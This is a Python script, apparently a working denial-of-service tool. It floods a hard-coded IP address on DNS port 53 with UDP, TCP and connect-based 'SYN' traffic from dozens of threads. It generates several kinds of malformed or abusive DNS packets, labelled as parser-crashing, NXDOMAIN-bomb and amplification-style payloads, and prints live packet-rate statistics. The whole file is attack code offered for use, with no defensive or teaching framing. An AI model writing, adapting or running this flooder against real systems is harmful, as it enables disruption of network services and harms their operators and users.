import socket
import threading
import time
import random
import struct

router_ip = "62.109.121.43"
DNS_PORT = 53

# Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'

# DANGEROUS DNS PAYLOADS
def nxdomain_bomb():
    """Force constant failed lookups"""
    domain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12)) + '.com'
    query = struct.pack('>HHHHHH', random.randint(1, 65535), 0x0100, 1, 0, 0, 0)
    query += b''.join(struct.pack('B', len(part)) + part.encode() for part in domain.split('.'))[:-1]
    query += b'\x00\x00\x01\x00\x01'
    return query + b'\x00' * 500  # Extra padding

def cname_chain():
    """Long recursive CNAME chain"""
    query = struct.pack('>HHHHHH', random.randint(1, 65535), 0x0100, 10, 0, 0, 0)
    for i in range(10):
        name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        query += struct.pack('B', len(name)) + name.encode()
    query += b'\x00\x00\x05\x00\x01'  # CNAME type
    return query

def oversized_response():
    """Simulate amplification attack"""
    header = struct.pack('>HHHHHH', random.randint(1, 65535), 0x8180, 1, 100, 0, 0)
    question = b'\x07example\x03com\x00\x00\x01\x00\x01'
    answers = b''
    for _ in range(100):
        answers += b'\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04' + socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
    return header + question + answers + b'\x00' * 2000

def malformed_parser():
    """Crash DNS parsers"""
    query = struct.pack('>HHHHHH', 0x0000, 0xFFFF, 0xFFFF, 0xFFFF, 0xFFFF, 0xFFFF)
    query += b'\xff' * 50
    query += b'\x00' * random.randint(100, 500)
    return query

def dna_redirect():
    """DNAME redirection loops"""
    query = struct.pack('>HHHHHH', random.randint(1, 65535), 0x0100, 1, 0, 0, 0)
    query += b'\x07example\x03com\x00\x00\x27\x00\x01'  # DNAME type
    query += b'\x00' * 100
    return query

def tsig_flood():
    """TSIG signature validation CPU drain"""
    query = struct.pack('>HHHHHH', random.randint(1, 65535), 0x0100, 1, 0, 0, 1)
    query += b'\x07example\x03com\x00\x00\x01\x00\x01'
    # Fake TSIG record
    tsig = b'\x00\xff\x00\xff' + b'\x00' * 48 + b'\x00' * 128
    query += tsig
    return query

payloads = [nxdomain_bomb, cname_chain, oversized_response, malformed_parser, dna_redirect, tsig_flood]

# Stats
stats = {"sent": 0, "data": 0, "success": 0, "fail": 0}
lock = threading.Lock()

def udp_dns_flood():
    while True:
        try:
            payload = random.choice(payloads)()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (router_ip, DNS_PORT))
            sock.close()
            
            with lock:
                stats["sent"] += 1
                stats["data"] += len(payload)
                stats["success"] += 1
        except:
            with lock:
                stats["fail"] += 1
        
        time.sleep(random.uniform(0, 0.0001))

def tcp_dns_flood():
    while True:
        try:
            payload = random.choice(payloads)()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((router_ip, DNS_PORT))
            # Add length prefix for TCP DNS
            length = struct.pack('>H', len(payload))
            sock.sendall(length + payload)
            sock.close()
            
            with lock:
                stats["sent"] += 1
                stats["data"] += len(payload) + 2
                stats["success"] += 1
        except:
            with lock:
                stats["fail"] += 1
        
        time.sleep(random.uniform(0, 0.0002))

def syn_flood():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.005)
            sock.connect_ex((router_ip, DNS_PORT))
            sock.close()
            
            with lock:
                stats["sent"] += 1
                stats["data"] += 64
                stats["success"] += 1
        except:
            with lock:
                stats["fail"] += 1
        
        time.sleep(random.uniform(0, 0.00005))

# Start attacks
for _ in range(15):  # UDP threads
    threading.Thread(target=udp_dns_flood, daemon=True).start()

for _ in range(8):   # TCP threads  
    threading.Thread(target=tcp_dns_flood, daemon=True).start()

for _ in range(10):  # SYN threads
    threading.Thread(target=syn_flood, daemon=True).start()

# Logging
last_time = time.time()
while True:
    time.sleep(5)
    
    with lock:
        pps = stats["sent"] // 5
        data_mb = stats["data"] / (1024 * 1024)
        success = stats["success"]
        fail = stats["fail"]
        
        # Reset
        stats["sent"] = 0
        stats["data"] = 0
        stats["success"] = 0
        stats["fail"] = 0
    
    amp_ratio = data_mb * 8 / (pps * 0.001) if pps > 0 else 0
    
    print(f"{MAGENTA}POISON{RESET}:{GREEN}{pps}{RESET}:{RED}{amp_ratio:.1f}x{RESET}")
    print(f"{CYAN}UDP/TCP/SYN{RESET} {YELLOW}MIX{RESET}")
    print(f"{GREEN}✓{success}{RESET} {RED}✗{fail}{RESET}")
    print()
